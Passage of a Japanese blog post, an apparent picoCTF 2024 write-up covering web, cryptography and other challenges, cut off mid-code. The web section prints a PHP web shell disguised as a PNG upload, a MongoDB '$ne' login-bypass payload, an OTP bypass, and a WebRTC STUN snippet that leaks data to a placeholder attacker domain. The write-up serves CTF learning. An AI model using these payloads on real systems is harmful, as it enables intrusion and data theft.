<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>picoCTF 2024 - Writeup | 俺とお前とlaysakura</title>
  
  <link rel="canonical" href="https://laysakura.github.io/2024/03/27/picoctf-2024/"/>
  <meta name="viewport" content="width=device-width">
  <meta name="description" content="picoCTF 2024に個人参加し、6954チーム中72位でした。 感想とwriteupを書きます。問題スクリーンショットは開催期間中のものなので、Solved数やLike数は参考程度に見てください。picoCTFの問題は開催期間終了後もご自身で解けるはずなので是非挑戦してみてください。">
<meta property="og:type" content="article">
<meta property="og:title" content="picoCTF 2024 - Writeup">
<meta property="og:url" content="https://laysakura.github.io/2024/03/27/picoctf-2024/index.html">
<meta property="og:site_name" content="俺とお前とlaysakura">
<meta property="og:description" content="picoCTF 2024に個人参加し、6954チーム中72位でした。 感想とwriteupを書きます。問題スクリーンショットは開催期間中のものなので、Solved数やLike数は参考程度に見てください。picoCTFの問題は開催期間終了後もご自身で解けるはずなので是非挑戦してみてください。">
<meta property="og:locale" content="ja_JP">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/rank.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/score-summary.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%201.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%202.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%203.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%204.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%205.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%206.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%207.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%208.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%209.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2010.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2011.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2012.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2013.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2014.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2015.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2016.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2017.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2018.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2019.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2020.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2021.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2022.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2023.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2024.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2025.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2026.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2027.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2028.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2029.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2030.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2031.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2032.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2033.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2034.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2035.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2036.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2037.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2038.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2039.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2040.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2041.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2042.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2043.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2044.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2045.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2046.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2047.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2048.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2049.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2051.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2052.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2053.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2054.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2055.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2056.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2057.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2058.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/03-27/Untitled%2059.png">
<meta property="article:published_time" content="2024-03-26T15:00:00.000Z">
<meta property="article:modified_time" content="2024-03-26T22:01:11.878Z">
<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="セキュリティ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://laysakura.github.io/img/2024/03-27/rank.png">

  <!-- favicon -->
  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
  <link rel="icon" href="/favicon/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
  <link rel="manifest" href="/favicon/site.webmanifest">
  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">

  

  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-22289437-2']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


  <!-- MathJax -->
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
  </script

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div id="container">
    <div class="mobile-nav-panel">
	<i class="icon-reorder icon-large"></i>
</div>
<header id="header">
	<h1 class="blog-title">
		<a href="/">俺とお前とlaysakura</a>
	</h1>
	<nav class="nav">
		<ul>
			<li><a href="/archives">過去の投稿</a></li>
			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
		</ul>
	</nav>
	<div id="search-form-wrap">
		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
	</div>
</header>
    <div id="main">
      <article id="post-picoCTF2024-Writeup" class="post">
  <footer class="entry-meta-header">
    <span class="meta-elements date">
      <a href="/2024/03/27/picoctf-2024/" class="article-date">
  <time datetime="2024-03-26T15:00:00.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </span>
  </footer>
  
  <header class="entry-header">
    
  
    <h1 class="article-title entry-title" itemprop="name">
      picoCTF 2024 - Writeup
    </h1>
  

  </header>
  <div class="entry-content">
    
    <img src="/img/2024/03-27/rank.png" width="auto" height="auto">
<br>

<p>picoCTF 2024に個人参加し、6954チーム中<strong>72位</strong>でした。</p>
<p>感想とwriteupを書きます。問題スクリーンショットは開催期間中のものなので、Solved数やLike数は参考程度に見てください。<br>picoCTFの問題は開催期間終了後もご自身で解けるはずなので是非挑戦してみてください。</p>
<span id="more"></span>

<h2><span id="目次">目次</span></h2><!-- toc -->

<ul>
<li><a href="#%E8%A7%A3%E3%81%91%E3%81%9F%E5%95%8F%E9%A1%8C">解けた問題</a></li>
<li><a href="#%E6%84%9F%E6%83%B3">感想</a></li>
<li><a href="#web-exploitation">Web Exploitation</a><ul>
<li><a href="#bookmarklet">Bookmarklet</a></li>
<li><a href="#webdecode">WebDecode</a></li>
<li><a href="#introtoburp">IntroToBurp</a></li>
<li><a href="#unminify">Unminify</a></li>
<li><a href="#no-sql-injection">No Sql Injection</a></li>
<li><a href="#trickster">Trickster</a></li>
<li><a href="#%E8%A7%A3%E3%81%91%E3%81%9A-elements">(解けず😭) elements</a><ul>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B1-xss%E3%81%A7%E6%94%BB%E6%92%83%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%81%AB%E3%83%AA%E3%83%BC%E3%82%AF">無理筋1 - XSSで攻撃サーバーにリーク</a></li>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B15-rtc%E3%81%A7csp-bypass">無理筋1.5 - RTCでCSP bypass</a></li>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B2-x%E8%BB%A2%E9%80%81%E3%81%97%E3%81%A6%E7%94%BB%E9%9D%A2%E3%82%92%E8%A6%97%E3%81%8D%E8%A6%8B%E3%82%8B">無理筋2: X転送して画面を覗き見る</a></li>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B3-chromium%E3%81%AE%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E7%94%A8%E3%83%9D%E3%83%BC%E3%83%88%E3%81%AB%E3%81%A4%E3%81%AA%E3%81%90">無理筋3: chromiumのデバッグ用ポートにつなぐ</a></li>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B4-chromium%E3%81%AB%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E6%9B%B8%E3%81%8B%E3%81%9B%E3%81%A6%E3%83%AA%E3%83%BC%E3%82%AF">無理筋4: chromiumにローカルファイルを書かせてリーク</a></li>
<li><a href="#%E7%84%A1%E7%90%86%E7%AD%8B5-prototype-pollution-to-rce">無理筋?5: Prototype Pollution to RCE</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cryptography">Cryptography</a><ul>
<li><a href="#interencdec">interencdec</a></li>
<li><a href="#custom-encryption">Custom encryption</a></li>
<li><a href="#c3">C3</a></li>
<li><a href="#rsa_oracle">rsa_oracle</a></li>
<li><a href="#%E8%A7%A3%E3%81%91%E3%81%9A-flag_printer">(解けず😭) flag_printer</a></li>
</ul>
</li>
<li><a href="#reverse-engineering">Reverse Engineering</a><ul>
<li><a href="#packer">packer</a></li>
<li><a href="#factcheck">FactCheck</a></li>
<li><a href="#classic-crackme-0x100">Classic Crackme 0x100</a></li>
<li><a href="#weirdsnake">weirdSnake</a></li>
<li><a href="#winantidbg0x100">WinAntiDbg0x100</a></li>
<li><a href="#winantidbg0x200">WinAntiDbg0x200</a></li>
<li><a href="#winantidbg0x300">WinAntiDbg0x300</a></li>
</ul>
</li>
<li><a href="#forensics">Forensics</a><ul>
<li><a href="#scan-surprise">Scan Surprise</a></li>
<li><a href="#verify">Verify</a></li>
<li><a href="#canyousee">CanYouSee</a></li>
<li><a href="#secret-of-the-polyglot">Secret of the Polyglot</a></li>
<li><a href="#mob-psycho">Mob psycho</a></li>
<li><a href="#endianness-v2">endianness-v2</a></li>
<li><a href="#blast-from-the-past">Blast from the past</a></li>
<li><a href="#dear-diary">Dear Diary</a></li>
</ul>
</li>
<li><a href="#general-skills">General Skills</a><ul>
<li><a href="#super-ssh">Super SSH</a></li>
<li><a href="#commitment-issues">Commitment Issues</a></li>
<li><a href="#time-machine">Time Machine</a></li>
<li><a href="#blame-game">Blame Game</a></li>
<li><a href="#collaborative-development">Collaborative Development</a></li>
<li><a href="#binhexa">binhexa</a></li>
<li><a href="#binary-search">Binary Search</a></li>
<li><a href="#endianness">endianness</a></li>
<li><a href="#dont-you-love-banners">dont-you-love-banners</a></li>
<li><a href="#sansalpha">SansAlpha</a></li>
</ul>
</li>
<li><a href="#binary-exploitation">Binary Exploitation</a><ul>
<li><a href="#format-string-0">format string 0</a></li>
<li><a href="#heap-0">heap 0</a></li>
<li><a href="#heap-1">heap 1</a></li>
<li><a href="#heap-2">heap 2</a></li>
<li><a href="#heap-3">heap 3</a></li>
<li><a href="#format-string-1">format string 1</a></li>
<li><a href="#format-string-2">format string 2</a></li>
<li><a href="#format-string-3">format string 3</a></li>
<li><a href="#babygame3">babygame3</a></li>
<li><a href="#%E8%A7%A3%E3%81%91%E3%81%9A-high-frequency-troubles">(解けず😭) high frequency troubles</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h2><span id="解けた問題">解けた問題</span></h2><img src="/img/2024/03-27/score-summary.png" width="auto" height="auto">

<p>Forensics, General Skills, Reverse Engineeringは全完。<br>それ以外のBinary Exploitation (pwn), Cryptography, Web Exploitationはそれぞれ最難関問題が解けずという結果でした。</p>
<h2><span id="感想">感想</span></h2><p>去年からCTFを始めて以来、picoCTFには貴重な常設CTFとして大変お世話になったので、イベントでたくさん問題解けて成長を実感できてよかったです。</p>
<p>picoらしく簡単な問題は簡単でしたが、スコア400点以上の問題は滅茶苦茶に骨がありました…<br>解けなかった問題も色々な解法を試す中であやふやな知識が整理されていったので有意義でした。</p>
<p>今回のコンテストで以下の要素を初体験できました。</p>
<ul>
<li>WindowsのPEファイル (.exe) の動的解析</li>
<li>UPXでパックされた（静的にアンパック可能な）マルウェアの解析</li>
<li>大規模な連立1次方程式の求解</li>
<li>CSP (Content-Security-Policy) が厳しい条件でのXSS</li>
<li>GOT Overwrite</li>
<li>gdbscriptを使ったpwnのデバッグ</li>
</ul>
<p>また、苦手としていたpwnが最難問題以外は全部解けたので、自信に繋がりました。</p>
<h2><span id="web-exploitation">Web Exploitation</span></h2><h3><span id="bookmarklet">Bookmarklet</span></h3><img src="/img/2024/03-27/Untitled.png" width="550px" height="auto"> 

<p>ブックマークレット… 懐かし…</p>
<p>Web Consoleで実行。</p>
<img src="/img/2024/03-27/Untitled%201.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s3cur3_c0nn3ct10n_5d09a462}

</aside>

<h3><span id="webdecode">WebDecode</span></h3><img src="/img/2024/03-27/Untitled%202.png" width="550px" height="auto"> 

<p>Aboutのページのソースコードで臭い箇所あったので確認したら、Base64デコードでフラグ。</p>
<img src="/img/2024/03-27/Untitled%203.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{web_succ3ssfully_d3c0ded_02cdcb59}

</aside>

<h3><span id="introtoburp">IntroToBurp</span></h3><img src="/img/2024/03-27/Untitled%204.png" width="550px" height="auto"> 

<p>OTP (One Time Password) な二段階認証に見える。</p>
<p>しかし二段階目のリクエストボディから <code>otp=</code> を取り除けばbypassできる。</p>
<img src="/img/2024/03-27/Untitled%205.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{＃0TP_Bypvss_SuCc3$S_3e3ddc76} （＃を全角文字にしているので注意）

</aside>

<h3><span id="unminify">Unminify</span></h3><img src="/img/2024/03-27/Untitled%206.png" width="550px" height="auto"> 

<p>ソースコードに書いてあるだけ。BurpなりでPretty表示していれば瞬殺。</p>
<img src="/img/2024/03-27/Untitled%207.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{pr3tty_c0d3_743d0f9b}

</aside>

<h3><span id="no-sql-injection">No Sql Injection</span></h3><img src="/img/2024/03-27/Untitled%208.png" width="550px" height="auto"> 

<p><code>app/api/login/route.ts</code> を読むと、</p>
<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">POST</span> = <span class="keyword">async</span> (<span class="params">req: <span class="built_in">any</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; email, password &#125; = <span class="keyword">await</span> req.<span class="title function_">json</span>();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">connectToDB</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">seedUsers</span>();</span><br><span class="line">    <span class="keyword">const</span> users = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">      <span class="attr">email</span>: email.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>) &amp;&amp; email.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&quot;</span>) ? <span class="title class_">JSON</span>.<span class="title function_">parse</span>(email) : email,</span><br><span class="line">      <span class="attr">password</span>: password.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>) &amp;&amp; password.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&quot;</span>) ? <span class="title class_">JSON</span>.<span class="title function_">parse</span>(password) : password</span><br><span class="line">    &#125;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>とやっている。裏側はMongoDBであることも別の箇所からわかるので、否定マッチで <code>&quot;email&quot;: &#123; &quot;$ne&quot;: &quot;nai-nai&quot; &#125;</code> みたいにすれば良い。</p>
<img src="/img/2024/03-27/Untitled%209.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_f2f185f2}

</aside>

<h3><span id="trickster">Trickster</span></h3><img src="/img/2024/03-27/Untitled%2010.png" width="550px" height="auto"> 

<p>robots.txt があるので見てみる。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure>

<p><code>/uploads/</code> にファイル置かれそう。ここに .php でも置いてRCEかな？</p>
<p>instructions.txt を読んでみる。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">	look for &quot;.png&quot; extension in the submitted files</span><br><span class="line">	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain &#x27;PNG&#x27; in hexadecimal: &quot;50 4E 47&quot; )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure>

<p><code>first few bytes contain &#39;PNG&#39; in hexadecimal: &quot;50 4E 47&quot;</code> が怪しい。first few bytesで良いんだ。</p>
<p>拡張子は <code>.png</code> である必要はなく、 <code>.png.php</code> で良いことも試せばすぐわかるので、以下の内容で <code>a.png.php</code> を作る。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% cat a.png.php</span><br><span class="line">PNG</span><br><span class="line">&lt;div&gt;Use `?cmd=` param.&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;-------------------- OUTPUT --------------------&lt;/div&gt;</span><br><span class="line">&lt;pre&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;div&gt;-------------------- END OUTPUT --------------------&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>これをアップロードし、 <code>/uploads/a.png.php</code> にアクセス。PHPのエラーが出ててうまく動いてそう。</p>
<p>あとは</p>
<ul>
<li><code>/uploads/a.png.php?cmd=find / -name &#39;*.txt&#39;</code> にアクセスして <code>/var/www/html/MFRDAZLDMUYDG.txt</code> という怪しいファイルを見つけ、</li>
<li><code>/uploads/a.png.php?cmd=cat /var/www/html/MFRDAZLDMUYDG.txt</code></li>
</ul>
<p>すればフラグが見える。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}

</aside>

<h3><span id="解けず-elements">(解けず😭) elements</span></h3><img src="/img/2024/03-27/Untitled%2011.png" width="550px" height="auto"> 

<p>解けなかった。以下、滅茶苦茶な試行錯誤のあとに無理筋だと気づいた方針をメモしておく。解けた人のwriteupを早く見たい…</p>
<p>（ここに書いたことに実は見落としがあって実は正攻法かもしれない。あくまでも筆者の戒め用と思って、解けた人のwriteupを参考にしてください）</p>
<h4><span id="無理筋1-xssで攻撃サーバーにリーク">無理筋1 - XSSで攻撃サーバーにリーク</span></h4><p>一見すると、index.js での eval() を使ってXSS → URLのフラグメントを攻撃サーバー（HTTPやDNS）にリークさせる問題に見える。</p>
<p>しかし policy.json で</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;URLAllowlist&quot;</span>:[<span class="string">&quot;127.0.0.1:8080&quot;</span>],<span class="string">&quot;URLBlocklist&quot;</span>:[<span class="string">&quot;*&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>となっているので、外部への通信が全く発生しないchromiumになっている。</p>
<p>あと、↓で NETWORK_PREDICTION_NEVER にもしているし、絶対にDNSリークもさせない気概を感じる。</p>
<img src="/img/2024/03-27/Untitled%2012.png" width="550px" height="auto"> 

<h4><span id="無理筋15-rtcでcsp-bypass">無理筋1.5 - RTCでCSP bypass</span></h4><p>無理筋1の派生。CSPが結構固い問題だが、調べるとRTCなら↓のようにCSP bypassできるという記事を見かけた。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_">async</span>()=&gt;&#123;p=<span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;<span class="attr">iceServers</span>:[&#123;<span class="attr">urls</span>: <span class="string">&quot;stun:LEAK.your-domain&quot;</span>&#125;]&#125;);p.<span class="title function_">createDataChannel</span>(<span class="string">&#x27;&#x27;</span>);p.<span class="title function_">setLocalDescription</span>(<span class="keyword">await</span> p.<span class="title function_">createOffer</span>())&#125;)()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://webhook.site/">https://webhook.site/</a> やBurp Collaboratorなどと組み合わせ、サブドメイン部分にクレデンシャルをセットさせてSTUNサーバーにリクエストさせるのが一つの定石。</p>
<p>しかし今回は、Chromiumのビルド時にwindow (JSでのglobalなあれ) からRTCPeerConnectionが生えなくなっている。</p>
<img src="/img/2024/03-27/Untitled%2013.png" width="550px" height="auto"> 

<h4><span id="無理筋2-x転送して画面を覗き見る">無理筋2: X転送して画面を覗き見る</span></h4><p>転送するための入口（ssh, ファイルシステム共有, etc）開いてないし無理だと思う。</p>
<h4><span id="無理筋3-chromiumのデバッグ用ポートにつなぐ">無理筋3: chromiumのデバッグ用ポートにつなぐ</span></h4><p>tcp&#x2F;8080 しか開いてないしweb appサーバーに専有されてるし、無理なはず。</p>
<h4><span id="無理筋4-chromiumにローカルファイルを書かせてリーク">無理筋4: chromiumにローカルファイルを書かせてリーク</span></h4><p>index.htmlとかにフラグを書いてもらう発想。</p>
<p>ブラウザのファイルシステムAPIはshowSaveFilePicker を使ってユーザーアクションさせることが必要そうで、ちょっと成立しなさそう。</p>
<h4><span id="無理筋5-prototype-pollution-to-rce">無理筋?5: Prototype Pollution to RCE</span></h4><p>ここまでで見たように、chromiumクライアントサイドで変なことさせてもそれを攻撃者が知る術が見つからない。</p>
<p>サーバーサイドで直接変なこと、特にRCEが起こせれば、chromiumを介さずにフラグファイルを攻撃サーバーに転送するようなこともできるはず。</p>
<p>RCE手段として今回ギリギリありそうなのは、入力JSONを通じたPrototype Pollution。しかし自分の力量では今回の index.mjs からPrototype Pollution可能な箇所は見つからなかった。</p>
<p>（一番正解に近いのはこれかなぁと思っている。Prototype Pollutionさえ刺されば<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#spawn-exploitation">これとかでchromiumの代わりにnodeをforkしつつ任意コード実行</a>ができるはず）</p>
<h2><span id="cryptography">Cryptography</span></h2><h3><span id="interencdec">interencdec</span></h3><img src="/img/2024/03-27/Untitled%2014.png" width="550px" height="auto"> 

<p>Base64っぽいのが書いてあるのでデコード。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% <span class="built_in">base64</span> -d &lt; enc_flag</span><br><span class="line">b<span class="string">&#x27;d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2kyMDRoa2o2fQ==&#x27;</span></span><br></pre></td></tr></table></figure>

<p>まだBase64っぽいので、面倒になりそうな気がしてCyberChefでデコード。</p>
<p>シーザー暗号っぽいものが出てくるのでROT13 Brute Forceしてフラグ。</p>
<img src="/img/2024/03-27/Untitled%2015.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{caesar_d3cr9pt3d_b204adc6}

</aside>

<h3><span id="custom-encryption">Custom encryption</span></h3><img src="/img/2024/03-27/Untitled%2016.png" width="550px" height="auto"> 

<p>数値の shared_key と文字列の text_key を頑張って導出する問題だと思ったが、いざ導出したら custom_encryption.py の <code>test()</code> 関数にハードコードされているものと同じで無駄骨だった。</p>
<hr>
<p>添付の custom_encryption.py の <code>test()</code> 関数を見ると、DH (Diffie-Hellman) 法みたいに鍵合意している。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">u = g^a (mod p)</span><br><span class="line">v = g^b (mod p)</span><br><span class="line"></span><br><span class="line">key = u^b = g^&#123;ab&#125; (mod p)</span><br><span class="line">b_key = v^a = g^&#123;ab&#125; (mod p)</span><br></pre></td></tr></table></figure>

<p>これ自体はそんなに解法に関係ない。</p>
<hr>
<p><code>shared_key</code> を割り出す。</p>
<p><code>encrypt()</code> 関数を見れば、 <code>enc_flag</code> に書かれた暗号文の各整数要素は、 <code>key*311</code> を素因数に持っていることがわかる。したがって、最大公約数を求めれば <code>key = shared_key = 93</code> とわかる。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">260307</span>, <span class="number">491691</span>, ...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。</span></span><br><span class="line"><span class="string">    したがって、cipher の各要素の GCD // 311 が key である。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span 